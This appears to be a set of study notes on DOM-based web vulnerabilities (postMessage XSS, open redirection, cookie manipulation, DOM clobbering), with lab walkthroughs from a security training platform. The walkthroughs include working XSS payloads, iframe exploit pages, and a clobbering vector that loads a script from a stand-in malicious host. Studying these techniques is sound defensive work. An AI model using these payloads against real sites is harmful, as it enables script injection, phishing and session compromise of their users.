## DOM-based vulnerabilities
### What is the DOM?

The Document Object Model (DOM) is a web browser's hierarchical representation of the elements on the page. Websites can use JavaScript to manipulate the nodes and objects of the DOM, as well as their properties. DOM manipulation in itself is not a problem. In fact, it is an integral part of how modern websites work. However, JavaScript that handles data insecurely can enable various attacks. DOM-based vulnerabilities arise when a website contains JavaScript that takes an attacker-controllable value, known as a source, and passes it into a dangerous function, known as a sink. 
### Taint-flow vulnerabilities

Many DOM-based vulnerabilities can be traced back to problems with the way client-side code manipulates attacker-controllable data.

**What is taint flow?**

To either exploit or mitigate these vulnerabilities, it is important to first familiarize yourself with the basics of taint flow between sources and sinks.

**Sources**

A source is a JavaScript property that accepts data that is potentially attacker-controlled. An example of a source is the **location.search** property because it reads input from the query string, which is relatively simple for an attacker to control. Ultimately, any property that can be controlled by the attacker is a potential source. This includes the referring URL (exposed by the **document.referrer** string), the user's cookies (exposed by the **document.cookie** string), and web messages.

**Sinks**

A sink is a potentially dangerous JavaScript function or DOM object that can cause undesirable effects if attacker-controlled data is passed to it. For example, the **eval()** function is a sink because it processes the argument that is passed to it as JavaScript. An example of an HTML sink is **document.body.innerHTML** because it potentially allows an attacker to inject malicious HTML and execute arbitrary JavaScript.

Fundamentally, DOM-based vulnerabilities arise when a website passes data from a source to a sink, which then handles the data in an unsafe way in the context of the client's session.

The most common source is the URL, which is typically accessed with the location object. An attacker can construct a link to send a victim to a vulnerable page with a payload in the query string and fragment portions of the URL. Consider the following code:
goto = location.hash.slice(1)
if (goto.startsWith('https:')) {
  location = goto;
}

This is vulnerable to DOM-based open redirection because the location.hash source is handled in an unsafe way. If the URL contains a hash fragment that starts with https:, this code extracts the value of the location.hash property and sets it as the location property of the window. An attacker could exploit this vulnerability by constructing the following URL:
https://www.innocent-website.com/example#https://www.evil-user.net

When a victim visits this URL, the JavaScript sets the value of the location property to https://www.evil-user.net, which automatically redirects the victim to the malicious site. This behavior could easily be exploited to construct a phishing attack, for example.
Common sources

The following are typical sources that can be used to exploit a variety of taint-flow vulnerabilities:
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database

The following kinds of data can also be used as sources to exploit taint-flow vulnerabilities: 
### Controlling the web message source

In this section, we'll look at how web messages can be used as a source to exploit DOM-based vulnerabilities on the recipient page. We'll also describe how such an attack is constructed, including how common origin-verification techniques can often be bypassed.

If a page handles incoming web messages in an unsafe way, for example, by not verifying the origin of incoming messages correctly in the event listener, properties and functions that are called by the event listener can potentially become sinks. For example, an attacker could host a malicious iframe and use the postMessage() method to pass web message data to the vulnerable event listener, which then sends the payload to a sink on the parent page. This behavior means that you can use web messages as the source for propagating malicious data to any of those sinks. 

### What is the impact of DOM-based web message vulnerabilities?

The potential impact of the vulnerability depends on the destination document's handling of the incoming message. If the destination document trusts the sender not to transmit malicious data in the message, and handles the data in an unsafe way by passing it into a sink, then the joint behavior of the two documents may allow an attacker to compromise the user, for example.
### How to construct an attack using web messages as the source

**postMessage()** is a method that allows cross-origin communication between different windows, such as iframes, pop-ups, or even different tabs. The function syntax is:
```js
window.postMessage(message, targetOrigin, [transfer]);
```

- message: The data being sent (can be a string, object, or other serializable data).
- targetOrigin: Specifies which origin should receive the message. If set to "*", any origin can receive the message.
- transfer: (Optional) Used for transferring objects like MessagePort.

Consider the following code:
```html
<script>
window.addEventListener('message', function(e) {
  eval(e.data);
});
</script>
```
This is vulnerable because an attacker could inject a JavaScript payload by constructing the following `iframe`:
```html
<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">
```
As the event listener does not verify the origin of the message, and the postMessage() method specifies the targetOrigin "*", the event listener accepts the payload and passes it into a sink, in this case, the eval() function. 
### Lab: DOM XSS using web messages

This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes the print() function to be called. 



This lab have the following script:
```html
</section>
<div id="ads"></div>
<script>
window.addEventListener('message', function(e) {
  document.getElementById('ads').innerHTML = e.data;
});
</script>
```
**window.addEvenListener** examples:

```js
window.addEventListener("click", function() {
    alert("Window was clicked!");
});
```
When the user clicks anywhere on the window, an alert pops up.

```js
window.addEventListener("message", function(event) {
    console.log("Received message:", event.data);
}, false);
```
Listens for messages sent via **window.postMessage().**

Example: Sending a Message to an iframe
```html
<iframe id="myIframe" src="https://example.com"></iframe>

<script>
  var iframe = document.getElementById('myIframe');
  iframe.contentWindow.postMessage('Hello from parent', 'https://example.com');
</script>
```
-    This sends **"Hello from parent"** to the iframe at `https://example.com`.
 -   The iframe must have an event listener for message to receive it.

**Lab solution:**

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```
Store the exploit and deliver it to the victim.

When the iframe loads, the `postMessage()` method sends a web message to the home page. The event listener, which is intended to serve ads, takes the content of the web message and inserts it into the div with the ID ads. However, in this case it inserts our img tag, which contains an invalid src attribute. This throws an error, which causes the onerror event handler to execute our payload. 

### Lab: DOM XSS using web messages and a JavaScript URL

This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the `print()` function. 

The lab use the following script:
```html
<script>
  window.addEventListener('message', function(e) {
      var url = e.data;
      if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
          location.href = url;
      }
  }, false);
</script>
```
The above script listens for `postMessage` events and redirects the page (`location.href = url;`) based on the received message. This is a vulnerability because it allows an attacker to force a user to visit an arbitrary URL, leading to open redirect attacks or even phishing.

For example, this script will send the victim to another website:
```HTML
<iframe 
src="https://0a780042047e7db6806d539200d5005a.web-security-academy.net/" 
onload="this.contentWindow.postMessage('https://nglong05.github.io','*')">
```

To solve the lab, change the **message** to 
```
javascript:print()//http:
```
> location.href = "javascript:print()" executes the JavaScript code instead of navigating to a new page.
### Origin verification

Even if an event listener does include some form of origin verification, this verification step can sometimes be fundamentally flawed. For example, consider the following code:
```js
window.addEventListener('message', function(e) {
    if (e.origin.indexOf('normal-website.com') > -1) {
        eval(e.data);
    }
});
```
The indexOf method is used to try and verify that the origin of the incoming message is the **normal-website.com** domain. However, in practice, it only checks whether the string "**normal-website.com**" is contained anywhere in the origin URL. As a result, an attacker could easily bypass this verification step if the origin of their malicious message was **http://www.normal-website.com.evil.net**, for example.

The same flaw also applies to verification checks that rely on the **startsWith()** or **endsWith()** methods. For example, the following event listener would regard the origin **http://www.malicious-websitenormal-website.com** as safe:
```js
window.addEventListener('message', function(e) {
    if (e.origin.endsWith('normal-website.com')) {
        eval(e.data);
    }
});
```
### Lab: DOM XSS using web messages and JSON.parse

This lab uses web messaging and parses the message as JSON. To solve the lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function. 

```html
<script>
    window.addEventListener('message', function(e) {
        var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
        document.body.appendChild(iframe);
        try {
            d = JSON.parse(e.data);
        } catch(e) {
            return;
        }
        switch(d.type) {
            case "page-load":
                ACMEplayer.element.scrollIntoView();
                break;
            case "load-channel":
                ACMEplayer.element.src = d.url;
                break;
            case "player-height-changed":
                ACMEplayer.element.style.width = d.width + "px";
                ACMEplayer.element.style.height = d.height + "px";
                break;
        }
    }, false);
</script>
```
This script listens for **postMessage** events and processes the received data as a JSON object. The vulnerability lies in how it handles the "load-channel" case.
Here, the **d.url** value is directly assigned to iframe.src

Send a **postMessage** containing:
```json
{
    "type": "load-channel",
    "url": "javascript:alert(1)"
}
```
**postMessage:**
```js
this.contentWindow.postMessage('{"type": "load-channel","url": "javascript:alert(1)"}')
```
**Exploit script**
```html
<iframe src=https://0ab8008603ed846a800876a9008f0023.web-security-academy.net/ onload='this.contentWindow.postMessage("postmessage-here","*")'>
```
Final script:
```html
<iframe src=https://0ab8008603ed846a800876a9008f0023.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```
To accurate adding `\` [here](https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Regex','string':'%22'%7D,'%5C%5C%20%22',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'%20'%7D,'',true,false,true,false)&input=eyJ0eXBlIjogImxvYWQtY2hhbm5lbCIsInVybCI6ICJqYXZhc2NyaXB0OmFsZXJ0KDEpIn0)

## DOM-based open redirection

DOM-based open-redirection vulnerabilities arise when a script writes attacker-controllable data into a sink that can trigger cross-domain navigation. For example, the following code is vulnerable due to the unsafe way it handles the location.hash property:
```js
let url = /https?:\/\/.+/.exec(location.hash);
if (url) {
  location = url[0];
}
```
An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will cause a redirection to an arbitrary external domain.
What is the impact of DOM-based open redirection?

This behavior can be leveraged to facilitate phishing attacks against users of the website, for example. The ability to use an authentic application URL targeting the correct domain and with a valid TLS certificate (if TLS is used) lends credibility to the phishing attack because many users, even if they verify these features, will not notice the subsequent redirection to a different domain.

If an attacker is able to control the start of the string that is passed to the redirection API, then it may be possible to escalate this vulnerability into a JavaScript injection attack. An attacker could construct a URL with the javascript: pseudo-protocol to execute arbitrary code when the URL is processed by the browser. 

### Lab: DOM-based open redirection

This lab contains a DOM-based open-redirection vulnerability. To solve this lab, exploit this vulnerability and redirect the victim to the exploit server. 

```html
<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>
```

The script attempts to extract a URL from the current location 
```js
returnUrl = /url=(https?:\/\/.+)/.exec(location);
```
- This regex looks for a query parameter like ?url=https://example.com.
- If a match is found, returnUrl[1] will contain https://example.com.

The page then redirects the user:
```
location.href = returnUrl ? returnUrl[1] : "/";
```
 -   If a valid URL is found, the browser navigates to it.
 -   Otherwise, it redirects to /.

To exploit this vulnerability, simply let the user visit this url, or, in this lab visit yourself 
```
https://0a340090043450b180b43a0000d20092.web-security-academy.net/post?url=https://exploit-0a85000204b75028809d391e01fc00a8.exploit-server.net/exploit&postId=5
```
### Which sinks can lead to DOM-based open-redirection vulnerabilities?

The following are some of the main sinks can lead to DOM-based open-redirection vulnerabilities:

    location
    location.host
    location.hostname
    location.href
    location.pathname
    location.search
    location.protocol
    location.assign()
    location.replace()
    open()
    element.srcdoc
    XMLHttpRequest.open()
    XMLHttpRequest.send()
    jQuery.ajax()
    $.ajax()

## DOM-based cookie manipulation

 Some DOM-based vulnerabilities allow attackers to manipulate data that they do not typically control. This transforms normally-safe data types, such as cookies, into potential sources. DOM-based cookie-manipulation vulnerabilities arise when a script writes attacker-controllable data into the value of a cookie.

An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will set an arbitrary value in the user's cookie. Many sinks are largely harmless on their own, but DOM-based cookie-manipulation attacks demonstrate how low-severity vulnerabilities can sometimes be used as part of an exploit chain for a high-severity attack. For example, if JavaScript writes data from a source into document.cookie without sanitizing it first, an attacker can manipulate the value of a single cookie to inject arbitrary values:
```js
document.cookie = 'cookieName='+location.hash.slice(1);
```
If the website unsafely reflects values from cookies without HTML-encoding them, an attacker can use cookie-manipulation techniques to exploit this behavior. 
### Lab: DOM-based cookie manipulation

This lab demonstrates DOM-based client-side cookie manipulation. To solve this lab, inject a cookie that will cause XSS on a different page and call the print() function. You will need to use the exploit server to direct the victim to the correct pages. 

In this lab, there are 2 parts that need to be exploited:
```html
<script>
    document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>
```
and
```html
<a href='https://0a1000d30304788b800b94e0002800d2.web-security-academy.net/product?productId=1'>Last viewed product</a>
```

The script assigns **window.location** (the current URL) as the value of a cookie named **lastViewedProduct**.


>SameSite=None → Allows cookies to be sent in cross-site requests, making them vulnerable to CSRF.
Secure → Ensures cookies are only transmitted over HTTPS.

If the url is
```
https://0a1000d30304788b800b94e0002800d2.web-security-academy.net/product?productId=1&test123
```
the payload will be reflected in 
```html
<a href='https://0a1000d30304788b800b94e0002800d2.web-security-academy.net/product?productId=1&test123'>Last viewed product</a>
```
I can escape by this payload:
```js
test123'><script>print()</script>
```
The problem is that the cookie (payload) needs to be stored first in the victim's browser before it can be reflected and executed. Manually, this requires visiting the payload URL twice—once to store the cookie and again to execute it.

To automate this, we use an iframe-based attack:
```html
<iframe src="https://0a1000d30304788b800b94e0002800d2.web-security-academy.net/product?productId=1&'><script>print()</script>" 
onload="if(!window.x)this.src='https://0a1000d30304788b800b94e0002800d2.web-security-academy.net';window.x=1;">
</iframe>
```

- First, the iframe loads the payload URL, **poisoning the user's cookie**. 
- Once the iframe finishes loading, the **onload** event is triggered.
    - `if(!window.x)` ensures this runs only once. 
    - The iframe's src is then changed to the home page, causing the browser to visit it with the poisoned cookie.
- Now, when the homepage is visited, the poisoned cookie is used, reflecting and executing the XSS payload.

## DOM clobbering

DOM clobbering is a technique in which you inject HTML into a page to manipulate the DOM and ultimately change the behavior of JavaScript on the page. DOM clobbering is particularly useful in cases where XSS is not possible, but you can control some HTML on a page where the attributes id or name are whitelisted by the HTML filter. The most common form of DOM clobbering uses an anchor element to overwrite a global variable, which is then used by the application in an unsafe way, such as generating a dynamic script URL.

The term clobbering comes from the fact that you are "clobbering" a global variable or property of an object and overwriting it with a DOM node or HTML collection instead. For example, you can use DOM objects to overwrite other JavaScript objects and exploit unsafe names, such as submit, to interfere with a form's actual submit() function. 

A common pattern used by JavaScript developers is:
```js
var someObject = window.someObject || {};
```
If you can control some of the HTML on the page, you can clobber the someObject reference with a DOM node, such as an anchor. Consider the following code:
```html
<script>
    window.onload = function(){
        let someObject = window.someObject || {};
        let script = document.createElement('script');
        script.src = someObject.url;
        document.body.appendChild(script);
    };
</script>
```
To exploit this vulnerable code, you could inject the following HTML to clobber the someObject reference with an anchor element:
```html
<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>
```
As the two anchors use the same ID, the DOM groups them together in a DOM collection. The DOM clobbering vector then overwrites the someObject reference with this DOM collection. A name attribute is used on the last anchor element in order to clobber the url property of the someObject object, which points to an external script. 